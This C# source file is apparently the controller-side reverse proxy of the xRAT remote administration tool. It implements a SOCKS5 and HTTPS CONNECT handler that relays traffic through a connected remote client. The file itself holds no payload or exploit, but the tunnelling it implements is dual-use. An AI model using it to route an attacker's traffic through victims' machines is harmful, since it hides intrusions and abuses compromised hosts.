using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xServer.Core.ReverseProxy.Packets;

namespace xServer.Core.ReverseProxy
{
    public class ReverseProxyClient
    {
        public enum ProxyType { Unknown, Socks5, HTTPS };
        public const int SOCKS5_DEFAULT_PORT = 3218;
        public const byte SOCKS5_VERSION_NUMBER = 5;
        public const byte SOCKS5_RESERVED = 0x00;
        public const byte SOCKS5_AUTH_NUMBER_OF_AUTH_METHODS_SUPPORTED = 2;
        public const byte SOCKS5_AUTH_METHOD_NO_AUTHENTICATION_REQUIRED = 0x00;
        public const byte SOCKS5_AUTH_METHOD_GSSAPI = 0x01;
        public const byte SOCKS5_AUTH_METHOD_USERNAME_PASSWORD = 0x02;
        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_BEGIN = 0x03;
        public const byte SOCKS5_AUTH_METHOD_IANA_ASSIGNED_RANGE_END = 0x7f;
        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_BEGIN = 0x80;
        public const byte SOCKS5_AUTH_METHOD_RESERVED_RANGE_END = 0xfe;
        public const byte SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS = 0xff;
        public const byte SOCKS5_CMD_REPLY_SUCCEEDED = 0x00;
        public const byte SOCKS5_CMD_REPLY_GENERAL_SOCKS_SERVER_FAILURE = 0x01;
        public const byte SOCKS5_CMD_REPLY_CONNECTION_NOT_ALLOWED_BY_RULESET = 0x02;
        public const byte SOCKS5_CMD_REPLY_NETWORK_UNREACHABLE = 0x03;
        public const byte SOCKS5_CMD_REPLY_HOST_UNREACHABLE = 0x04;
        public const byte SOCKS5_CMD_REPLY_CONNECTION_REFUSED = 0x05;
        public const byte SOCKS5_CMD_REPLY_TTL_EXPIRED = 0x06;
        public const byte SOCKS5_CMD_REPLY_COMMAND_NOT_SUPPORTED = 0x07;
        public const byte SOCKS5_CMD_REPLY_ADDRESS_TYPE_NOT_SUPPORTED = 0x08;
        public const byte SOCKS5_ADDRTYPE_IPV4 = 0x01;
        public const byte SOCKS5_ADDRTYPE_DOMAIN_NAME = 0x03;
        public const byte SOCKS5_ADDRTYPE_IPV6 = 0x04;
        
        //Make it higher for more performance if really required... probably not
        //Making this number higher will aswell increase ram usage depending on the amount of connections (BUFFER_SIZE x Connections = ~Ram Usage)
        public const int BUFFER_SIZE = 8192; 

        public Socket Handle { get; private set; }
        public Client Client { get; private set; }
        private bool ReceivedConnResponse = false;

        //Is used for the handshake, Non-Blocking
        private MemoryStream HandshakeStream;

        public long PacketsReceived { get; private set; }
        public long PacketsSended { get; private set; }

        public long LengthReceived { get; private set; }
        public long LengthSended { get; private set; }

        private byte[] Buffer;

        public int ConnectionId
        {
            get { return Handle.Handle.ToInt32(); }
        }

        public string TargetServer { get; private set; }
        public ushort TargetPort { get; private set; }
        public bool IsConnected { get; private set; }


        private bool IsConnectCommand;
        private bool IsBindCommand;
        private bool IsUdpCommand;

        private bool IsIpType;
        private bool IsDomainNameType;
        private bool IsIPV6NameType;
        private bool DisconnectIsSend = false;

        public ProxyType Type { get; private set; }
        private ReverseProxyServer Server;
        public ListViewItem ListItem { get; set; }

        public ReverseProxyClient(Client Client, Socket socket, ReverseProxyServer Server)
        {
            this.Handle = socket;
            this.Client = Client;
            this.HandshakeStream = new MemoryStream();
            this.Buffer = new byte[BUFFER_SIZE];
            this.IsConnected = true;
            this.TargetServer = "";
            this.Type = ProxyType.Unknown;
            this.Server = Server;

            socket.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_Receive, null);
        }

        private void socket_Receive(IAsyncResult ar)
        {
            try
            {
                int Received = Handle.EndReceive(ar);

                if (Received <= 0)
                {
                    Disconnect();
                    return;
                }
                if (Received > 5000 || HandshakeStream.Length + Received > 5000)
                {
                    //attack prevention of overflowing the HandshakeStream
                    //It's really impossible for Socks or HTTPS proxies to use even 5000 for Initial Packets
                    Disconnect();
                    return;
                }

                LengthReceived += Received;
                HandshakeStream.Write(Buffer, 0, Received);
            }
            catch
            {
                Disconnect();
                return;
            }

            byte[] Payload = HandshakeStream.ToArray();

            switch (PacketsReceived)
            {
                case 0:
                {
                    //initial Socks packet
                    if (Payload.Length >= 3)
                    {
                        string HeaderStr = ASCIIEncoding.ASCII.GetString(Payload);

                        //check the proxy client
                        if (Payload[0] == SOCKS5_VERSION_NUMBER)
                        {
                            Type = ProxyType.Socks5;
                        }
                        else if (HeaderStr.StartsWith("CONNECT") && HeaderStr.Contains(":"))
                        {
                            Type = ProxyType.HTTPS;

                            //Grab here the IP / PORT
                            using (StreamReader sr = new StreamReader(new MemoryStream(Payload)))
                            {
                                string line = sr.ReadLine();
                                if (line == null)
                                    break;

                                //could have done it better with RegEx... oh well
                                string[] Split = line.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                                if (Split.Length > 0)
                                {
                                    try
                                    {
                                        string IP_Port = Split[1];
                                        this.TargetServer = IP_Port.Split(':')[0];
                                        this.TargetPort = ushort.Parse(IP_Port.Split(':')[1]);

                                        this.IsConnectCommand = true;
                                        this.IsDomainNameType = true;

                                        //Send Command to client and wait for response from CommandHandler
                                        new ReverseProxy_Connect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
                                        Server.CallonConnectionEstablished(this);

                                        return; //Quit receiving and wait for client's response
                                    }
                                    catch { Disconnect(); }
                                }
                            }
                        }
                        else
                        {
                            break;
                        }

                        if (CheckProxyVersion(Payload))
                        {
                            SendSuccessToClient();
                            PacketsReceived++;
                            HandshakeStream.SetLength(0);
                            Server.CallonConnectionEstablished(this);
                        }
                    }
                    break;
                }
                case 1:
                {
                    //Socks command
                    int MinPacketLen = 6;
                    if (Payload.Length >= MinPacketLen)
                    {
                        if (!CheckProxyVersion(Payload))
                            return;

                        this.IsConnectCommand = Payload[1] == 1;
                        this.IsBindCommand = Payload[1] == 2;
                        this.IsUdpCommand = Payload[1] == 3;

                        this.IsIpType = Payload[3] == 1;
                        this.IsDomainNameType = Payload[3] == 3;
                        this.IsIPV6NameType = Payload[3] == 4;

                        Array.Reverse(Payload, Payload.Length - 2, 2);
                        this.TargetPort = BitConverter.ToUInt16(Payload, Payload.Length - 2);

                        if (IsConnectCommand)
                        {
                            if (IsIpType)
                            {
                                this.TargetServer = Payload[4] + "." + Payload[5] + "." + Payload[6] + "." + Payload[7];
                            }
                            else if (IsDomainNameType)
                            {
                                int DomainLen = Payload[4];
                                if (MinPacketLen + DomainLen < Payload.Length)
                                {
                                    this.TargetServer = ASCIIEncoding.ASCII.GetString(Payload, 5, DomainLen);
                                }
                            }

                            if (this.TargetServer.Length > 0)
                            {
                                //Send Command to client and wait for response from CommandHandler
                                new ReverseProxy_Connect(ConnectionId, this.TargetServer, this.TargetPort).Execute(Client);
                            }
                        }
                        else
                        {
                            SendFailToClient();
                            return;
                        }

                        Server.CallonUpdateConnection(this);
                        
                        //Quit receiving data and wait for Client's response
                        return;
                    }
                    break;
                }
            }

            Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_Receive, null);
        }

        public void Disconnect()
        {
            if (!DisconnectIsSend)
            {
                DisconnectIsSend = true;
                //send to the Server we've been disconnected
                new ReverseProxy_Disconnect(this.ConnectionId).Execute(Client);
            }

            try
            {
                Handle.Close();
            }
            catch { }

            IsConnected = false;
            Server.CallonUpdateConnection(this);
        }

        /// <summary>
        /// xRAT -> ProxyClient
        /// </summary>
        /// <param name="Payload"></param>
        public void SendToClient(byte[] Payload)
        {
            lock (Handle)
            {
                try
                {
                    LengthSended += Payload.Length;
                    Handle.Send(Payload);
                }
                catch { Disconnect(); }
            }
            Server.CallonUpdateConnection(this);
        }

        private void SendFailToClient()
        {
            if (Type == ProxyType.HTTPS)
                Disconnect();

            if (Type == ProxyType.Socks5)
            {
                SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_AUTH_METHOD_REPLY_NO_ACCEPTABLE_METHODS });
                Disconnect();
            }
        }

        private void SendSuccessToClient()
        {
            if (Type == ProxyType.Socks5)
                SendToClient(new byte[] { SOCKS5_VERSION_NUMBER, SOCKS5_CMD_REPLY_SUCCEEDED });
        }

        private bool CheckProxyVersion(byte[] Payload)
        {
            if (Type == ProxyType.HTTPS)
                return true; //unable to check header... there is no header

            if (Payload.Length > 0 && Payload[0] != SOCKS5_VERSION_NUMBER)
            {
                SendFailToClient();
                Disconnect();
                return false;
            }
            return true;
        }

        public void CommandResponse(ReverseProxy_ConnectResponse Response)
        {
            //a small prevention for calling this method twice, not required... just incase
            if (!ReceivedConnResponse)
            {
                ReceivedConnResponse = true;

                if (Response.IsConnected)
                {
                    //tell the Proxy Client that we've established a connection

                    if (Type == ProxyType.HTTPS)
                    {
                        SendToClient(ASCIIEncoding.ASCII.GetBytes("HTTP/1.0 200 Connection established\r\n\r\n"));
                    }
                    else if (Type == ProxyType.Socks5)
                    {
                        //Thanks to http://www.mentalis.org/soft/projects/proxy/ for the Maths
                        try
                        {
                            SendToClient(new byte[]
                            {
                                SOCKS5_VERSION_NUMBER,
                                SOCKS5_CMD_REPLY_SUCCEEDED,
                                SOCKS5_RESERVED,
                                1, //static: it's always 1
                                (byte)(Response.LocalEndPoint % 256),
						        (byte)(Math.Floor((decimal)(Response.LocalEndPoint % 65536) / 256)),
						        (byte)(Math.Floor((decimal)(Response.LocalEndPoint % 16777216) / 65536)),
						        (byte)(Math.Floor((decimal)Response.LocalEndPoint / 16777216)),
						        (byte)(Math.Floor((decimal)Response.LocalPort / 256)),
						        (byte)(Response.LocalPort % 256)
                            });
                        }
                        catch
                        {
                            //just incase the math failed
                            //it will still show it's succesful
                            SendToClient(new byte[]
                            {
                                SOCKS5_VERSION_NUMBER,
                                SOCKS5_CMD_REPLY_SUCCEEDED,
                                SOCKS5_RESERVED,
                                1, //static: it's always 1
                                0, 0, 0, 0, //bind ip
                                0, 0 //bind port
                            });
                        }
                    }

                    HandshakeStream.Close();

                    try
                    {
                        //start receiving data from the proxy
                        Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_ReceiveProxy, null);
                    }
                    catch
                    {
                        Disconnect();
                    }
                }
                else
                {
                    if (Type == ProxyType.HTTPS)
                    {
                        Disconnect();
                    }
                    else if (Type == ProxyType.Socks5)
                    {
                        //send a connection fail packet
                        SendToClient(new byte[]
                        {
                            SOCKS5_VERSION_NUMBER,
                            SOCKS5_CMD_REPLY_CONNECTION_REFUSED,
                            SOCKS5_RESERVED,
                            1, //static: it's always 1
                            0, 0, 0, 0, //Bind Address
                            0, 0 //Bind Port
                        });
                    }
                }

                Server.CallonUpdateConnection(this);
            }
        }

        private void socket_ReceiveProxy(IAsyncResult ar)
        {
            try
            {
                int Received = Handle.EndReceive(ar);

                if (Received <= 0)
                {
                    Disconnect();
                    return;
                }

                LengthReceived += Received;

                byte[] Payload = new byte[Received];
                Array.Copy(Buffer, Payload, Received);
                new ReverseProxy_Data(this.ConnectionId, Payload).Execute(Client);

                LengthSended += Payload.Length;
                PacketsSended++;
            }
            catch
            {
                Disconnect();
                return;
            }

            PacketsReceived++;

            Server.CallonUpdateConnection(this);

            Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, socket_ReceiveProxy, null);
        }
    }
}
